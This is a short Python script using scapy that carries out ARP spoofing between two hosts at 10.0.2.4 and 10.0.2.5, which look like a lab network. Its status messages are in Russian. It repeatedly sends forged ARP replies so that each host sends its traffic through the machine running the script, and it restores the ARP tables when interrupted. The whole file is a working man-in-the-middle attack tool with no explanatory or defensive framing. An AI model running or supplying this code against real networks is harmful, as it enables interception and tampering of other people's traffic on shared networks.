import scapy.all as scapy
import time
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_ip):
    (target_ip)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)
    print("Отправлен пакет: psrc={} pdst={} hwdst={}".format(spoof_ip, target_ip, target_mac))

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

def main():
    host1 = "10.0.2.4"
    host2 = "10.0.2.5"
    sent_packets_count = 0

    try:
        print("ARP спуфинг запущен")
        while True:
            spoof(host1, host2)
            spoof(host2, host1)
            sent_packets_count = sent_packets_count + 2
            time.sleep(2) # Ожидание 2сек
    except KeyboardInterrupt:
        print("Остановка ARP спуфинга...")
        restore(host2, host1)
        restore(host1, host2)
        print("Отправлено пакетов: "+str(sent_packets_count))
        print("ARP спуфинг остановлен")

if __name__ == "__main__":
    main()